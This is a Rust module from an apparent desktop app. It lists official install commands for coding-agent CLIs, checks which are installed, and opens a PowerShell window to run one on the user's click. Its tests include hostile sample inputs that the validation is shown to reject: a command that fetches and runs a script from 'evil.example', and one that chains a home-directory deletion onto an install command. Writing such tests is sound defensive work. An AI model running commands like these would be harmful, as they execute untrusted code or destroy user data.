// 安裝 CLI: on a fresh PC, the agent CLIs Coucou drives (Claude Code, Codex,
// Copilot CLI, Antigravity, Gemini CLI) and what they need (Node.js, Git) are
// listed in Settings with whether each is installed, its official install
// commands and a link to the vendor's page. Nothing is installed unless the
// person clicks 在終端機執行 on one command: it then opens in a PowerShell
// window of its own, where they watch it and answer its questions.
//
// The commands are a table written from each vendor's install page (checked
// 2026-10-07). 「向官方確認」 fetches those pages, on a click only, and tells
// whether each command still appears there; a changed command is picked up
// only when it keeps the same shape, host and package scope as the one in the
// table, so a page can never hand Coucou something else to run.

use serde::Serialize;
use std::path::{Path, PathBuf};

#[cfg(windows)]
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;

/// One way to install a CLI, run in PowerShell.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Method {
    /// "PowerShell", "WinGet" or "npm".
    pub label: String,
    pub command: String,
    pub note: String,
    /// "built-in" (the table), "confirmed" (seen on the official page),
    /// "updated" (the official page now gives this one), "unconfirmed"
    /// (the page was read and did not show it).
    pub source: String,
}

/// A CLI Coucou drives, or one they need.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Cli {
    pub id: String,
    pub name: String,
    /// The executable, as `where` would look it up.
    pub command: String,
    /// What it is for, in a line.
    pub purpose: String,
    pub docs: String,
    pub methods: Vec<Method>,
    pub found: Option<String>,
    pub version: Option<String>,
}

struct Row {
    id: &'static str,
    name: &'static str,
    command: &'static str,
    purpose: &'static str,
    docs: &'static str,
    methods: &'static [(&'static str, &'static str, &'static str)],
}

/// From the vendors' own install pages (each row's `docs`).
const TABLE: &[Row] = &[
    Row {
        id: "claude",
        name: "Claude Code",
        command: "claude",
        purpose: "Anthropic's coding agent: hooks in the island, and an agent for teams.",
        docs: "https://code.claude.com/docs/en/setup",
        methods: &[
            ("PowerShell", "irm https://claude.ai/install.ps1 | iex", "Recommended. Native install that updates itself; no Node.js needed."),
            ("WinGet", "winget install Anthropic.ClaudeCode", "Does not update itself: winget upgrade Anthropic.ClaudeCode."),
            ("npm", "npm install -g @anthropic-ai/claude-code", "Needs Node.js 22 or later."),
        ],
    },
    Row {
        id: "codex",
        name: "Codex CLI",
        command: "codex",
        purpose: "OpenAI's coding agent (codex app-server).",
        docs: "https://github.com/openai/codex",
        methods: &[
            ("PowerShell", "irm https://chatgpt.com/codex/install.ps1 | iex", "Official Windows installer."),
            ("npm", "npm install -g @openai/codex", "Needs Node.js."),
        ],
    },
    Row {
        id: "copilot",
        name: "Copilot CLI",
        command: "copilot",
        purpose: "GitHub Copilot in the terminal (ACP). Needs a Copilot subscription and PowerShell 6+.",
        docs: "https://docs.github.com/en/copilot/how-tos/set-up/install-copilot-cli",
        methods: &[
            ("WinGet", "winget install GitHub.Copilot", "Official Windows package."),
            ("npm", "npm install -g @github/copilot", "Needs Node.js 22 or later."),
        ],
    },
    Row {
        id: "agy",
        name: "Antigravity CLI (agy)",
        command: "agy",
        purpose: "Google Antigravity's agent in headless mode. Signs in with a Google account on first run.",
        docs: "https://antigravity.google/docs/getting-started?tab=cli",
        methods: &[("PowerShell", "irm https://antigravity.google/cli/install.ps1 | iex", "Official Windows installer.")],
    },
    Row {
        id: "gemini",
        name: "Gemini CLI",
        command: "gemini",
        purpose: "Google's Gemini agent, added in Settings → Agents as an ACP agent.",
        docs: "https://github.com/google-gemini/gemini-cli",
        methods: &[("npm", "npm install -g @google/gemini-cli", "Needs Node.js.")],
    },
    Row {
        id: "node",
        name: "Node.js",
        command: "node",
        purpose: "Needed by every npm install above (Copilot CLI and Claude Code over npm need version 22+).",
        docs: "https://nodejs.org/en/download",
        methods: &[("WinGet", "winget install OpenJS.NodeJS.LTS", "The LTS release from the WinGet catalog; nodejs.org also offers a Windows installer.")],
    },
    Row {
        id: "git",
        name: "Git for Windows",
        command: "git",
        purpose: "Recommended by Claude Code (its Bash tool uses Git Bash), and used by most agents.",
        docs: "https://git-scm.com/downloads/win",
        methods: &[("WinGet", "winget install --id Git.Git -e --source winget", "Official WinGet command from git-scm.com.")],
    },
];

fn table() -> Vec<Cli> {
    TABLE
        .iter()
        .map(|r| Cli {
            id: r.id.into(),
            name: r.name.into(),
            command: r.command.into(),
            purpose: r.purpose.into(),
            docs: r.docs.into(),
            methods: r.methods.iter().map(|(label, command, note)| Method { label: (*label).into(), command: (*command).into(), note: (*note).into(), source: "built-in".into() }).collect(),
            found: None,
            version: None,
        })
        .collect()
}

/// The table with the official pages' corrections, once they were checked.
fn current() -> Vec<Cli> {
    CHECKED.lock().unwrap().clone().unwrap_or_else(table)
}

static CHECKED: std::sync::Mutex<Option<Vec<Cli>>> = std::sync::Mutex::new(None);

// ── Is it installed? ─────────────────────────────────────────────────────────

/// PATH as Windows has it now (machine + user), not as Coucou inherited it
/// at launch: a CLI installed a minute ago is then found without a restart.
fn fresh_path() -> String {
    let inherited = std::env::var("PATH").unwrap_or_default();
    let mut cmd = std::process::Command::new("powershell.exe");
    cmd.args(["-NoProfile", "-NonInteractive", "-Command", "[Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [Environment]::GetEnvironmentVariable('Path','User')"]);
    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);
    match cmd.output() {
        Ok(out) if out.status.success() => {
            let fresh = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if fresh.is_empty() {
                inherited
            } else {
                format!("{fresh};{inherited}")
            }
        }
        _ => inherited,
    }
}

/// Where the installers above put their executables, for when PATH lags.
fn known_dirs() -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    if let Some(home) = std::env::var_os("USERPROFILE") {
        dirs.push(PathBuf::from(&home).join(".local").join("bin"));
    }
    if let Some(appdata) = std::env::var_os("APPDATA") {
        dirs.push(PathBuf::from(appdata).join("npm"));
    }
    if let Some(local) = std::env::var_os("LOCALAPPDATA") {
        let local = PathBuf::from(local);
        dirs.push(local.join("agy").join("bin"));
        dirs.push(local.join("Antigravity"));
        dirs.push(local.join("Microsoft").join("WinGet").join("Links"));
        dirs.push(local.join("Microsoft").join("WindowsApps"));
    }
    dirs
}

/// Looks `stem` up the way `where` would: each folder, each executable extension.
fn find(stem: &str, path: &str) -> Option<PathBuf> {
    let exts = [".exe", ".cmd", ".bat", ".com"];
    let dirs = std::env::split_paths(path).chain(known_dirs());
    for dir in dirs {
        if dir.as_os_str().is_empty() {
            continue;
        }
        for ext in exts {
            let candidate = dir.join(format!("{stem}{ext}"));
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

async fn version(exe: &Path, path: &str) -> Option<String> {
    // npm shims are batch files: they only run through cmd.
    let shim = exe.extension().and_then(|e| e.to_str()).is_some_and(|e| e.eq_ignore_ascii_case("cmd") || e.eq_ignore_ascii_case("bat"));
    let mut cmd = if shim {
        let mut c = tokio::process::Command::new("cmd");
        c.arg("/c").arg(exe);
        c
    } else {
        tokio::process::Command::new(exe)
    };
    cmd.arg("--version").env("PATH", path).stdin(std::process::Stdio::null());
    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);
    let out = tokio::time::timeout(std::time::Duration::from_secs(15), cmd.output()).await.ok()?.ok()?;
    let text = String::from_utf8_lossy(&out.stdout);
    let line = text.lines().map(str::trim).find(|l| !l.is_empty())?;
    Some(line.chars().take(80).collect())
}

/// Every CLI in the table, each looked up and asked its version.
pub async fn status() -> Vec<Cli> {
    let path = tokio::task::spawn_blocking(fresh_path).await.unwrap_or_default();
    let mut list = current();
    let checks = list.iter().map(|c| {
        let found = find(&c.command, &path);
        let path = path.clone();
        async move {
            let v = match &found {
                Some(exe) => version(exe, &path).await,
                None => None,
            };
            (found, v)
        }
    });
    let results = futures_join(checks).await;
    for (cli, (found, v)) in list.iter_mut().zip(results) {
        cli.found = found.map(|p| p.display().to_string());
        cli.version = v;
    }
    list
}

/// Runs the version checks side by side (no futures crate: tokio tasks).
async fn futures_join<F, T>(futs: impl Iterator<Item = F>) -> Vec<T>
where
    F: std::future::Future<Output = T> + Send + 'static,
    T: Send + 'static,
{
    let handles: Vec<_> = futs.map(tokio::spawn).collect();
    let mut out = Vec::with_capacity(handles.len());
    for h in handles {
        out.push(h.await.expect("version check panicked"));
    }
    out
}

// ── Checking the official pages ──────────────────────────────────────────────

/// The page's text: tags dropped, the usual entities decoded, spaces folded.
fn page_text(html: &str) -> String {
    let mut out = String::with_capacity(html.len());
    let mut in_tag = false;
    for ch in html.chars() {
        match ch {
            '<' => in_tag = true,
            '>' if in_tag => in_tag = false,
            _ if !in_tag => out.push(ch),
            _ => {}
        }
    }
    let out = out.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&#x27;", "'").replace("&nbsp;", " ");
    out.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Only these characters may make up a command taken from a page.
fn plain(command: &str) -> bool {
    command.chars().all(|c| c.is_ascii_alphanumeric() || " @/._:-|".contains(c))
}

/// What a command from a page must keep from the table's: for
/// `irm https://host/… | iex` the host, for `npm install -g @scope/…` the
/// scope, for `winget install Publisher.…` the publisher.
fn anchor(command: &str) -> Option<String> {
    if let Some(rest) = command.strip_prefix("irm https://") {
        return Some(format!("irm https://{}/", rest.split('/').next()?));
    }
    if let Some(rest) = command.strip_prefix("npm install -g ") {
        return Some(format!("npm install -g {}", rest.split('/').next()?));
    }
    if let Some(rest) = command.strip_prefix("winget install ") {
        if rest.starts_with("--") {
            return None;
        }
        return Some(format!("winget install {}.", rest.split('.').next()?));
    }
    None
}

/// The command on the page that starts like `anchor`, cut where it ends.
fn found_on_page(text: &str, anchor: &str, irm: bool) -> Option<String> {
    let at = text.find(anchor)?;
    let rest = &text[at..];
    let command = if irm {
        // irm URL | iex
        let end = rest.find("| iex")? + "| iex".len();
        rest[..end].to_string()
    } else {
        // Up to the end of the package or package id.
        let words: Vec<&str> = rest.split(' ').collect();
        let n = anchor.split(' ').count();
        words.get(..n)?.join(" ")
    };
    (plain(&command) && command.len() < 120).then_some(command)
}

/// 「向官方確認」: reads each vendor's page and notes, per command, whether
/// it is still there or what replaced it.
pub async fn check_official() -> Result<Vec<Cli>, String> {
    let client = reqwest::Client::builder().timeout(std::time::Duration::from_secs(20)).user_agent("Coucou").build().map_err(|e| e.to_string())?;
    let mut list = table();
    let mut reached = 0;
    for cli in list.iter_mut() {
        let Ok(resp) = client.get(&cli.docs).send().await else { continue };
        let Ok(html) = resp.text().await else { continue };
        reached += 1;
        let text = page_text(&html);
        for m in cli.methods.iter_mut() {
            if text.contains(&m.command) {
                m.source = "confirmed".into();
                continue;
            }
            let found = anchor(&m.command).and_then(|a| found_on_page(&text, &a, m.command.starts_with("irm ")));
            match found {
                Some(newer) if newer != m.command => {
                    m.command = newer;
                    m.source = "updated".into();
                }
                _ => m.source = "unconfirmed".into(),
            }
        }
    }
    if reached == 0 {
        return Err("None of the official pages could be reached; the built-in commands are shown.".into());
    }
    *CHECKED.lock().unwrap() = Some(list.clone());
    Ok(list)
}

// ── Running one, on the person's click ───────────────────────────────────────

/// Opens a PowerShell window running install `method` of CLI `id` — only a
/// command from the table (or its checked replacement), never text from the page.
pub fn run(id: &str, method: usize) -> Result<String, String> {
    let list = current();
    let cli = list.iter().find(|c| c.id == id).ok_or("Unknown CLI.")?;
    let m = cli.methods.get(method).ok_or("Unknown install method.")?;
    if !plain(&m.command) {
        return Err("That command has characters Coucou will not run.".into());
    }
    let script = format!(
        "Write-Host 'Coucou: installing {name} with:' -ForegroundColor Cyan; Write-Host '  {cmd}'; Write-Host ''; {cmd}; Write-Host ''; Write-Host 'Done. Close this window, then click Check again in Coucou Settings.' -ForegroundColor Cyan",
        name = cli.name,
        cmd = m.command
    );
    let mut cmd = std::process::Command::new("powershell.exe");
    cmd.args(["-NoExit", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &script]);
    #[cfg(windows)]
    cmd.creation_flags(CREATE_NEW_CONSOLE);
    cmd.spawn().map_err(|e| format!("Could not open PowerShell: {e}"))?;
    crate::log::line(format!("cli install: {} via {}", cli.id, m.label));
    Ok(m.command.clone())
}

/// The built-in list without looking anything up, for the first drawing.
pub fn list() -> Vec<Cli> {
    current()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_built_in_command_is_plain_and_has_an_anchor_or_is_fixed() {
        for cli in table() {
            assert!(cli.docs.starts_with("https://"), "{}", cli.id);
            for m in cli.methods {
                assert!(plain(&m.command), "{}", m.command);
            }
        }
    }

    #[test]
    fn a_page_s_command_is_taken_only_with_the_same_host_or_scope() {
        let text = page_text("<pre><code>irm https://claude.ai/install2.ps1 <span>|</span> iex</code></pre> and npm install -g @anthropic-ai/claude-code-next now");
        assert_eq!(found_on_page(&text, &anchor("irm https://claude.ai/install.ps1 | iex").unwrap(), true).as_deref(), Some("irm https://claude.ai/install2.ps1 | iex"));
        assert_eq!(found_on_page(&text, &anchor("npm install -g @anthropic-ai/claude-code").unwrap(), false).as_deref(), Some("npm install -g @anthropic-ai/claude-code-next"));
        assert_eq!(found_on_page("irm https://evil.example/x.ps1 | iex", &anchor("irm https://claude.ai/install.ps1 | iex").unwrap(), true), None);
        assert_eq!(anchor("winget install GitHub.Copilot").as_deref(), Some("winget install GitHub."));
        assert!(!plain("irm https://claude.ai/x.ps1 | iex; rm -r ~"));
    }
}
